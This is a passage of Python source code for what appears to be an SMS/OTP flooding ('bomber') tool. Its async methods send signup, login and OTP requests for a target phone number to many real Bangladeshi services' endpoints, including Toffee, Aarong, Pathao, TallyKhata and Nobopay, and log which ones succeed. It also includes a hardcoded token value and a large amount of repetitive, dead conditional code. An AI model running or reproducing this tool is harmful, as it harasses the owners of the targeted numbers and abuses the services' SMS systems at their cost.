            elif "BCS Exam" in "CURL038 prod-services.toffeelive.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL038 prod-services.toffeelive.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL038 prod-services.toffeelive.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL038 prod-services.toffeelive.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL038 prod-services.toffeelive.com": payload = {"mobile": target}
            elif "Kirei" in "CURL038 prod-services.toffeelive.com": payload = {"phone": target}
            elif "Shikho" in "CURL038 prod-services.toffeelive.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL038 prod-services.toffeelive.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL038 prod-services.toffeelive.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL038 prod-services.toffeelive.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL038 prod-services.toffeelive.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl039_prod_services_toffeelive_com(self):
        target = self.target
        url = "https://prod-services.toffeelive.com/sms/v1/subscriber/signup"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL039 prod-services.toffeelive.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL039 prod-services.toffeelive.com": pass
            elif "Bioscope" in "CURL039 prod-services.toffeelive.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL039 prod-services.toffeelive.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL039 prod-services.toffeelive.com": payload = {"phone": target}
            elif "Medha" in "CURL039 prod-services.toffeelive.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL039 prod-services.toffeelive.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL039 prod-services.toffeelive.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL039 prod-services.toffeelive.com": payload = {"mobile": target}
            elif "MyGP" in "CURL039 prod-services.toffeelive.com": pass
            elif "BDSTall" in "CURL039 prod-services.toffeelive.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL039 prod-services.toffeelive.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL039 prod-services.toffeelive.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL039 prod-services.toffeelive.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL039 prod-services.toffeelive.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL039 prod-services.toffeelive.com": payload = {"mobile": target}
            elif "Kirei" in "CURL039 prod-services.toffeelive.com": payload = {"phone": target}
            elif "Shikho" in "CURL039 prod-services.toffeelive.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL039 prod-services.toffeelive.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL039 prod-services.toffeelive.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL039 prod-services.toffeelive.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL039 prod-services.toffeelive.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl040_prod_services_toffeelive_com(self):
        target = self.target
        url = "https://prod-services.toffeelive.com/sms/v1/subscriber/otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL040 prod-services.toffeelive.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL040 prod-services.toffeelive.com": pass
            elif "Bioscope" in "CURL040 prod-services.toffeelive.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL040 prod-services.toffeelive.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL040 prod-services.toffeelive.com": payload = {"phone": target}
            elif "Medha" in "CURL040 prod-services.toffeelive.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL040 prod-services.toffeelive.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL040 prod-services.toffeelive.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL040 prod-services.toffeelive.com": payload = {"mobile": target}
            elif "MyGP" in "CURL040 prod-services.toffeelive.com": pass
            elif "BDSTall" in "CURL040 prod-services.toffeelive.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL040 prod-services.toffeelive.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL040 prod-services.toffeelive.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL040 prod-services.toffeelive.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL040 prod-services.toffeelive.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL040 prod-services.toffeelive.com": payload = {"mobile": target}
            elif "Kirei" in "CURL040 prod-services.toffeelive.com": payload = {"phone": target}
            elif "Shikho" in "CURL040 prod-services.toffeelive.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL040 prod-services.toffeelive.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL040 prod-services.toffeelive.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL040 prod-services.toffeelive.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL040 prod-services.toffeelive.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl041_tethys_trucklagbe_com(self):
        target = self.target
        url = "https://tethys.trucklagbe.com/tl_gateway/tl_login/128/checkUserStatus"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL041 tethys.trucklagbe.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL041 tethys.trucklagbe.com": pass
            elif "Bioscope" in "CURL041 tethys.trucklagbe.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL041 tethys.trucklagbe.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL041 tethys.trucklagbe.com": payload = {"phone": target}
            elif "Medha" in "CURL041 tethys.trucklagbe.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL041 tethys.trucklagbe.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL041 tethys.trucklagbe.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL041 tethys.trucklagbe.com": payload = {"mobile": target}
            elif "MyGP" in "CURL041 tethys.trucklagbe.com": pass
            elif "BDSTall" in "CURL041 tethys.trucklagbe.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL041 tethys.trucklagbe.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL041 tethys.trucklagbe.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL041 tethys.trucklagbe.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL041 tethys.trucklagbe.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL041 tethys.trucklagbe.com": payload = {"mobile": target}
            elif "Kirei" in "CURL041 tethys.trucklagbe.com": payload = {"phone": target}
            elif "Shikho" in "CURL041 tethys.trucklagbe.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL041 tethys.trucklagbe.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL041 tethys.trucklagbe.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL041 tethys.trucklagbe.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL041 tethys.trucklagbe.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl042_mcprod_aarong_com(self):
        target = self.target
        url = "https://mcprod.aarong.com/graphql"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL042 mcprod.aarong.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL042 mcprod.aarong.com": pass
            elif "Bioscope" in "CURL042 mcprod.aarong.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL042 mcprod.aarong.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL042 mcprod.aarong.com": payload = {"phone": target}
            elif "Medha" in "CURL042 mcprod.aarong.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL042 mcprod.aarong.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL042 mcprod.aarong.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL042 mcprod.aarong.com": payload = {"mobile": target}
            elif "MyGP" in "CURL042 mcprod.aarong.com": pass
            elif "BDSTall" in "CURL042 mcprod.aarong.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL042 mcprod.aarong.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL042 mcprod.aarong.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL042 mcprod.aarong.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL042 mcprod.aarong.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL042 mcprod.aarong.com": payload = {"mobile": target}
            elif "Kirei" in "CURL042 mcprod.aarong.com": payload = {"phone": target}
            elif "Shikho" in "CURL042 mcprod.aarong.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL042 mcprod.aarong.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL042 mcprod.aarong.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL042 mcprod.aarong.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL042 mcprod.aarong.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl043_www_aarong_com(self):
        target = self.target
        url = "https://www.aarong.com/api/auth/generate-token-web"
        method = "GET"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL043 www.aarong.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL043 www.aarong.com": pass
            elif "Bioscope" in "CURL043 www.aarong.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL043 www.aarong.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL043 www.aarong.com": payload = {"phone": target}
            elif "Medha" in "CURL043 www.aarong.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL043 www.aarong.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL043 www.aarong.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL043 www.aarong.com": payload = {"mobile": target}
            elif "MyGP" in "CURL043 www.aarong.com": pass
            elif "BDSTall" in "CURL043 www.aarong.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL043 www.aarong.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL043 www.aarong.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL043 www.aarong.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL043 www.aarong.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL043 www.aarong.com": payload = {"mobile": target}
            elif "Kirei" in "CURL043 www.aarong.com": payload = {"phone": target}
            elif "Shikho" in "CURL043 www.aarong.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL043 www.aarong.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL043 www.aarong.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL043 www.aarong.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL043 www.aarong.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl044_api_englishmojabd_com(self):
        target = self.target
        url = "https://api.englishmojabd.com/api/v1/auth/login"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL044 api.englishmojabd.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL044 api.englishmojabd.com": pass
            elif "Bioscope" in "CURL044 api.englishmojabd.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL044 api.englishmojabd.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL044 api.englishmojabd.com": payload = {"phone": target}
            elif "Medha" in "CURL044 api.englishmojabd.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL044 api.englishmojabd.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL044 api.englishmojabd.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL044 api.englishmojabd.com": payload = {"mobile": target}
            elif "MyGP" in "CURL044 api.englishmojabd.com": pass
            elif "BDSTall" in "CURL044 api.englishmojabd.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL044 api.englishmojabd.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL044 api.englishmojabd.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL044 api.englishmojabd.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL044 api.englishmojabd.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL044 api.englishmojabd.com": payload = {"mobile": target}
            elif "Kirei" in "CURL044 api.englishmojabd.com": payload = {"phone": target}
            elif "Shikho" in "CURL044 api.englishmojabd.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL044 api.englishmojabd.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL044 api.englishmojabd.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL044 api.englishmojabd.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL044 api.englishmojabd.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl045_api_pathao_com(self):
        target = self.target
        url = "https://api.pathao.com/v2/auth/register"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL045 api.pathao.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL045 api.pathao.com": pass
            elif "Bioscope" in "CURL045 api.pathao.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL045 api.pathao.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL045 api.pathao.com": payload = {"phone": target}
            elif "Medha" in "CURL045 api.pathao.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL045 api.pathao.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL045 api.pathao.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL045 api.pathao.com": payload = {"mobile": target}
            elif "MyGP" in "CURL045 api.pathao.com": pass
            elif "BDSTall" in "CURL045 api.pathao.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL045 api.pathao.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL045 api.pathao.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL045 api.pathao.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL045 api.pathao.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL045 api.pathao.com": payload = {"mobile": target}
            elif "Kirei" in "CURL045 api.pathao.com": payload = {"phone": target}
            elif "Shikho" in "CURL045 api.pathao.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL045 api.pathao.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL045 api.pathao.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL045 api.pathao.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL045 api.pathao.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl046_web_tallykhata_com(self):
        target = self.target
        url = "https://web.tallykhata.com/api/auth/init"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL046 web.tallykhata.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL046 web.tallykhata.com": pass
            elif "Bioscope" in "CURL046 web.tallykhata.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL046 web.tallykhata.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL046 web.tallykhata.com": payload = {"phone": target}
            elif "Medha" in "CURL046 web.tallykhata.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL046 web.tallykhata.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL046 web.tallykhata.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL046 web.tallykhata.com": payload = {"mobile": target}
            elif "MyGP" in "CURL046 web.tallykhata.com": pass
            elif "BDSTall" in "CURL046 web.tallykhata.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL046 web.tallykhata.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL046 web.tallykhata.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL046 web.tallykhata.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL046 web.tallykhata.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL046 web.tallykhata.com": payload = {"mobile": target}
            elif "Kirei" in "CURL046 web.tallykhata.com": payload = {"phone": target}
            elif "Shikho" in "CURL046 web.tallykhata.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL046 web.tallykhata.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL046 web.tallykhata.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL046 web.tallykhata.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL046 web.tallykhata.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl047_npapigwnew_nobopay_com(self):
        target = self.target
        url = "https://npapigwnew.nobopay.com/api/v2/tp/registration/otp/send"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL047 npapigwnew.nobopay.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL047 npapigwnew.nobopay.com": pass
            elif "Bioscope" in "CURL047 npapigwnew.nobopay.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL047 npapigwnew.nobopay.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL047 npapigwnew.nobopay.com": payload = {"phone": target}
            elif "Medha" in "CURL047 npapigwnew.nobopay.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL047 npapigwnew.nobopay.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL047 npapigwnew.nobopay.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL047 npapigwnew.nobopay.com": payload = {"mobile": target}
            elif "MyGP" in "CURL047 npapigwnew.nobopay.com": pass
            elif "BDSTall" in "CURL047 npapigwnew.nobopay.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL047 npapigwnew.nobopay.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL047 npapigwnew.nobopay.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL047 npapigwnew.nobopay.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL047 npapigwnew.nobopay.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL047 npapigwnew.nobopay.com": payload = {"mobile": target}
            elif "Kirei" in "CURL047 npapigwnew.nobopay.com": payload = {"phone": target}
            elif "Shikho" in "CURL047 npapigwnew.nobopay.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL047 npapigwnew.nobopay.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL047 npapigwnew.nobopay.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL047 npapigwnew.nobopay.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL047 npapigwnew.nobopay.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl048_distribution_hishabee_business(self):
        target = self.target
        url = "https://distribution.hishabee.business/api/app/v1/auth/number-check"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL048 distribution.hishabee.business": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL048 distribution.hishabee.business": pass
            elif "Bioscope" in "CURL048 distribution.hishabee.business": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL048 distribution.hishabee.business": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL048 distribution.hishabee.business": payload = {"phone": target}
            elif "Medha" in "CURL048 distribution.hishabee.business": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL048 distribution.hishabee.business": payload = {"number": "+88" + target}
            elif "Robi" in "CURL048 distribution.hishabee.business": payload = {"phone_number": target}
            elif "Arogga" in "CURL048 distribution.hishabee.business": payload = {"mobile": target}
            elif "MyGP" in "CURL048 distribution.hishabee.business": pass
            elif "BDSTall" in "CURL048 distribution.hishabee.business": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL048 distribution.hishabee.business": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL048 distribution.hishabee.business": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL048 distribution.hishabee.business": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL048 distribution.hishabee.business": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL048 distribution.hishabee.business": payload = {"mobile": target}
            elif "Kirei" in "CURL048 distribution.hishabee.business": payload = {"phone": target}
            elif "Shikho" in "CURL048 distribution.hishabee.business": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL048 distribution.hishabee.business": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL048 distribution.hishabee.business", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL048 distribution.hishabee.business", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL048 distribution.hishabee.business", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api109_local_otp_send_103_4_145_86(self):
        target = self.target
        url = "http://103.4.145.86:8096/api/app/v1/otp/send"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API109 - Local OTP Send (103.4.145.86)": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API109 - Local OTP Send (103.4.145.86)": pass
            elif "Bioscope" in "API109 - Local OTP Send (103.4.145.86)": payload = {"number": "+88" + target}
            elif "Proiojon" in "API109 - Local OTP Send (103.4.145.86)": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API109 - Local OTP Send (103.4.145.86)": payload = {"phone": target}
            elif "Medha" in "API109 - Local OTP Send (103.4.145.86)": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API109 - Local OTP Send (103.4.145.86)": payload = {"number": "+88" + target}
            elif "Robi" in "API109 - Local OTP Send (103.4.145.86)": payload = {"phone_number": target}
            elif "Arogga" in "API109 - Local OTP Send (103.4.145.86)": payload = {"mobile": target}
            elif "MyGP" in "API109 - Local OTP Send (103.4.145.86)": pass
            elif "BDSTall" in "API109 - Local OTP Send (103.4.145.86)": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API109 - Local OTP Send (103.4.145.86)": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API109 - Local OTP Send (103.4.145.86)": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API109 - Local OTP Send (103.4.145.86)": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API109 - Local OTP Send (103.4.145.86)": payload = {"phoneNumber": target}
            elif "Sindabad" in "API109 - Local OTP Send (103.4.145.86)": payload = {"mobile": target}
            elif "Kirei" in "API109 - Local OTP Send (103.4.145.86)": payload = {"phone": target}
            elif "Shikho" in "API109 - Local OTP Send (103.4.145.86)": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API109 - Local OTP Send (103.4.145.86)": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
